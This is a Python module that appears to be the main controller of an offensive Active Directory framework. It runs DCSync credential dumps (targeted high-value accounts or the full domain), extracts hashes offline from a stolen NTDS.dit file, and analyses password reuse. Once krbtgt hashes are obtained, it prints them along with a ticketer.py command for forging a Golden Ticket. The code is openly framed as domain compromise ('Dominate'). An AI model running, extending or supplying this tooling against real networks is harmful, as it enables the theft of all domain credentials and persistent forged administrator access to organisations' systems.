"""
DCSyncFramework — Main orchestrator for DCSync and domain compromise.

Coordinates: Auth → Targeted/Full/Offline extraction → Analysis → Reporting
"""

from pathlib import Path
from typing import Dict, List

from .auth import AuthBuilder
from ..modes.targeted import TargetedDCSync
from ..modes.full_dump import FullDCSync
from ..modes.offline import OfflineExtractor
from ..utils.analyzer import CredentialAnalyzer
from ..utils.commands import CommandReference
from ..utils.reporting import ReportGenerator


class DCSyncFramework:
    """
    Complete DCSync and domain credential extraction framework.

    Modes:
        1. Targeted DCSync — Extract specific high-value accounts
        2. Full DCSync — Complete domain credential dump
        3. NTDS.dit offline — Extract from stolen database file
        4. Credential analysis — Password patterns, reuse, statistics
    """

    def __init__(
        self,
        domain: str,
        dc_ip: str,
        username: str,
        password: str = "",
        ntlm_hash: str = "",
        aes_key: str = "",
        use_kerberos: bool = False,
        output_dir: str = "dcsync",
    ):
        self.domain = domain
        self.dc_ip = dc_ip
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)

        # Shared auth
        self.auth = AuthBuilder(
            domain, username, dc_ip, password, ntlm_hash, aes_key, use_kerberos
        )

        # State
        self.extracted_hashes: Dict[str, dict] = {}
        self.high_value_hashes: Dict[str, dict] = {}
        self.krbtgt_material: dict = {}

        # Sub-components
        self.targeted = TargetedDCSync(self.auth, self.output_dir)
        self.full = FullDCSync(self.auth, self.output_dir)
        self.offline = OfflineExtractor(self.output_dir)
        self.analyzer = CredentialAnalyzer(self.output_dir)
        self.reporter = ReportGenerator(domain, dc_ip, self.output_dir)

        self._print_banner(username, use_kerberos)

    def _print_banner(self, username: str, use_kerberos: bool):
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║           DCSYNC & DOMAIN COMPROMISE FRAMEWORK               ║
║                                                              ║
║  Replicate → Extract → Analyze → Dominate                    ║
╚══════════════════════════════════════════════════════════════╝
[+] Domain:  {self.domain}
[+] DC:      {self.dc_ip}
[+] User:    {username}
[+] Auth:    {'Kerberos' if use_kerberos else 'NTLM/Password'}
[+] Output:  {self.output_dir}
        """)

    # ── Delegating methods ──────────────────────────────────────

    def targeted_dcsync(self, target_users: List[str]) -> Dict[str, dict]:
        results = self.targeted.extract(target_users)
        self._ingest_results(results)
        return results

    def targeted_dcsync_high_value(self) -> Dict[str, dict]:
        results = self.targeted.extract_high_value()
        self._ingest_results(results)
        return results

    def full_dcsync(self, include_machine_accounts: bool = True) -> str:
        ntds_file = self.full.extract(include_machine_accounts)
        self.krbtgt_material = self.full.krbtgt_material
        return ntds_file

    def ntds_offline_extraction(
        self, ntds_path: str, system_path: str, security_path: str = ""
    ) -> str:
        return self.offline.extract(ntds_path, system_path, security_path)

    def analyze_dump(self, ntds_file: str):
        self.analyzer.analyze(ntds_file)

    def print_ntds_extraction_methods(self):
        CommandReference.print_ntds_extraction_methods(
            self.domain, self.dc_ip, self.auth.username
        )

    def generate_report(self):
        self.reporter.generate(
            self.extracted_hashes, self.high_value_hashes, self.krbtgt_material
        )

    # ── Full workflows ──────────────────────────────────────────

    def run_full_workflow(self, mode: str = "targeted"):
        """Execute the complete DCSync workflow."""
        print(f"\n{'#' * 60}")
        print(f"# DCSYNC WORKFLOW — MODE: {mode.upper()}")
        print(f"# Domain: {self.domain}")
        print(f"{'#' * 60}")

        if mode == "targeted":
            self.targeted_dcsync_high_value()

            if self.krbtgt_material:
                print(f"\n[!] ★ KRBTGT material available — Golden Ticket ready!")
                print(f"[!] NTLM: {self.krbtgt_material.get('ntlm', 'N/A')}")
                print(
                    f"[!] Use: ticketer.py -nthash <HASH> -domain-sid <SID>"
                    f" -domain {self.domain} Administrator"
                )

        elif mode == "full":
            ntds_file = self.full_dcsync()
            if ntds_file:
                self.analyze_dump(ntds_file)

        self.generate_report()

    # ── Internal ────────────────────────────────────────────────

    def _ingest_results(self, results: Dict[str, dict]):
        """Merge targeted extraction results into framework state."""
        for user, parsed in results.items():
            self.extracted_hashes[user] = parsed

            if user.lower() == "krbtgt":
                self.krbtgt_material = parsed

            if self.targeted.is_high_value(user):
                self.high_value_hashes[user] = parsed